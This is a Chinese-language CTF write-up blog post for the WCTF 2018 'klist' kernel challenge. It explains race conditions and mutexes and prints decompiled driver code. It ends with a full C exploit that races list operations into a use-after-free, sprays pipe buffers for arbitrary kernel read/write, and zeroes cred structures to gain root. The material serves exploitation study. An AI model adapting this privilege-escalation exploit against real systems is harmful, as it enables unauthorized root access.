---
layout: post
title: kernel pwn wctf2018-klist
excerpt: "kernel pwn"
categories: [未完待续]
comments: true
---
http://p4nda.top/2018/11/27/wctf-2018-klist/#select-item

https://blog.csdn.net/seaaseesa/article/details/104649351

https://blog.csdn.net/panhewu9919/article/details/100728934

启动脚本
```
#!/bin/sh
qemu-system-x86_64 \
	-m 1024 -smp cores=2,threads=2,sockets=1 \
	-display none -serial stdio -no-reboot \
	-cpu kvm64,+smep \
	-initrd ./rootfs.img \
	-kernel ./bzImage \
	-gdb tcp::1234 \
	-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet "
```

### 关于内核条件竞争漏洞
条件竞争发生在多线程多进程中，往往是因为没有对全局数据、函数进行加锁，导致多进程同时访问修改，使得数据与理想的不一致而引发漏洞。
### 关于互斥锁
互斥锁主要用于实现内核中的互斥访问功能。对它的访问必须遵循一些规则：同一时间只能有一个任务持有互斥锁，而且只有这个任务可以对互斥锁进行解锁。互斥锁不能进行递归锁定或解锁。一个互斥锁对象必须通过其API初始化，而不能使用memset或复制初始化。一个任务在持有互斥锁的时候是不能结束的。互斥锁所使用的内存区域是不能被释放的。使用中的互斥锁是不能被重新初始化的。并且互斥锁不能用于中断上下文。
#### 开始分析
在list_open中,发现使用了互斥锁
```
__int64 __fastcall list_open(__int64 a1, __int64 a2)
{
  __int64 v2; // rax@1
  __int64 v3; // rbx@1

  LODWORD(v2) = kmem_cache_alloc_trace(*((_QWORD *)&kmalloc_caches + 6), 21136064LL, 40LL);
  v3 = v2;
  _mutex_init(v2 + 8, "&data->lock", &copy_from_user);// 初始化互斥锁
  *(_QWORD *)(a2 + 200) = v3;
  return 0LL;
}
```
Read的时候，是从缓冲区里记录的节点里读取数据，每一步操作，都在互斥锁内部，说明这里执行时，其他线程会被排斥到外，直到当前线程执行完解锁。
```
signed __int64 __fastcall list_read(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // r12@1
  unsigned __int64 v4; // rbx@1
  __int64 *v5; // r13@1
  __int64 v6; // rsi@1
  __int64 v7; // rax@4
  signed __int64 v8; // rdi@4
  signed __int64 result; // rax@5

  v3 = a2;
  v4 = a3;
  v5 = *(__int64 **)(a1 + 200);
  mutex_lock(v5 + 1);                           // 获取互斥锁
  v6 = *v5;
  if ( *v5 )
  {
    if ( *(_QWORD *)(v6 + 8) <= v4 )
      v4 = *(_QWORD *)(v6 + 8);
    LODWORD(v7) = copy_to_user(v3, v6 + 24, v4);
    v8 = (signed __int64)(v5 + 1);
    if ( v7 )
    {
      mutex_unlock(v8);                         // unlock
      result = -22LL;
    }
    else
```
Write的时候，同理，向缓冲区记录的节点里写数据
```
signed __int64 __fastcall list_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx@1
  __int64 *v4; // rbp@1
  __int64 v5; // rdi@1
  __int64 v6; // rax@4
  signed __int64 v7; // rdi@4
  signed __int64 result; // rax@5

  v3 = a3;
  v4 = *(__int64 **)(a1 + 200);
  mutex_lock(v4 + 1);                           // 获取互斥锁
  v5 = *v4;
  if ( *v4 )
  {
    if ( *(_QWORD *)(v5 + 8) <= v3 )
      v3 = *(_QWORD *)(v5 + 8);
    LODWORD(v6) = copy_from_user(v5 + 24, a2, v3);
    v7 = (signed __int64)(v4 + 1);
    if ( v6 )
    {
      mutex_unlock(v7);                         // unlock
```
ioctl中包含一些增删改查的操作
```
int __fastcall list_ioctl(__int64 a1, unsigned int a2, __int64 a3)
{
  int result; // eax@5

  if ( a2 == 4920 )
  {
    result = select_item(a1, a3);
  }
  else
  {
    if ( a2 <= 0x1338 )
    {
      if ( a2 == 4919 )
        return add_item(a3);                    // 增
    }
    else
    {
      if ( a2 == 4921 )
        return remove_item(a3);                 // 删
      if ( a2 == 4922 )
        return list_head(a3);
    }
    result = -22;
  }
  return result;
}
```
最终的exp代码
```
// Exploit
//pipe
#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/audit.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/reg.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
// size of pipe buffers
#define SIZE 0x280

int list_add(int fd, char* data, long size) {
    long io[2];
    io[0] = size;
    io[1] = (long)data;
    return ioctl(fd, 0x1337, io);
}

int list_select(int fd, long index) {
    return ioctl(fd, 0x1338, index);
}

int list_remove(int fd, long index) {
    return ioctl(fd, 0x1339, index);
}

int list_do_head(int fd, char* data) {
    return ioctl(fd, 0x133a, data);
}

void check_win()
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            system("cat /flag");
            exit(0);
        }
    }
}

int main()
{
    /*setvbuf(stdout, NULL, _IONBF, 0);*/
    pid_t child_pid;
    char* bufA = malloc(SIZE);
    memset(bufA, 'A', SIZE);
    char* bufB = malloc(SIZE);
    memset(bufB, 'B', SIZE);
    char* buf2 = malloc(SIZE);
    memset(buf2, 'C', SIZE);
    char* buf3 = malloc(SIZE);
    memset(buf3, 'D', SIZE);

    int fd = open("/dev/klist", O_RDWR);
    list_add(fd, bufA, SIZE-24);
    list_select(fd, 0);

    puts("beginning race");
    child_pid = fork();
    if (child_pid == 0)
    {
        for(int i = 0; i < 200; i++)     //开200个子进程，死循环，检查是否提权
        {
            child_pid = fork();
            if(child_pid == 0)
                check_win();
        }

        while(1)           // 死循环: add + remove 操作，读取到新数据就停止
        {
            list_add(fd, bufA, SIZE-24);     // 竞争点: remove时list_head线程插入一个put，bufA被释放，flag==0
            list_select(fd, 0);  // 选择之后flag==1
            // 目的已经达到，现在select一直选中这个块了，可以达到任意地址读写的目的
            list_remove(fd, 0);              // 再释放一次bufA, 避免未碰撞时note增加太多。若竞争成功，会把bufA释放kfree两次，不会报错
            list_add(fd, bufB, SIZE-24);     // bufA 恰好被B覆盖
            read(fd, buf2, SIZE-24);
            if(buf2[0] != 'A') {
                puts("race won!");
                break;
            }
            list_remove(fd, 0);              // 没赢，再次尝试
        }

        // 删除并添加管道来占据首个 note
        sleep(1);
        list_remove(fd, 0);
        memset(buf3, 'E', SIZE);
        int fds[2];

        pipe(&fds[0]);
        // 堆喷， 把size覆盖很大，这样就能任意读写。 其实可以只write 1次
        for(int i = 0; i < 9; i++) {
            write(fds[1], buf3, SIZE);
        }

        // 读取内存，泄露cred，修改cred
        unsigned int *ibuf = (unsigned int *)malloc(0x1000000);
        read(fd, ibuf, 0x1000000);
        int j;
        unsigned long max_i = 0;
        int count = 0;
        for(int i = 0; i < 0x1000000/4; i++)
        {
            if (ibuf[i] == 1000 && ibuf[i+1] == 1000 && ibuf[i+7] == 1000)
            {
                printf("[+] We got cred!\n");
                //for (int x=0; x<10; x+=1)
                //  printf("0x%x ",ibuf[x]);
                max_i = i+8;
                for(j = 0; j < 8; j++)
                    ibuf[i+j] = 0;
                count++;
                if(count >= 2)
                    break;
            }
        }
        write(fd, ibuf, max_i*4);

        check_win();
    }
    else if (child_pid > 0)
    {
        // 死循环: 调用list_head 尝试减去flag
        // 读到新数据时停止
        while(1) {
            if(list_do_head(fd, buf3)) {
                puts("wtf head failed");
            }
            read(fd, buf2, SIZE-24);
            if(buf2[0] != 'A') {
                puts("race won thread 2!");
                break;
            }
        }
        check_win();
    }
    else
    {
        puts("fork failed");
        return -1;
    }
    return 0;
}

```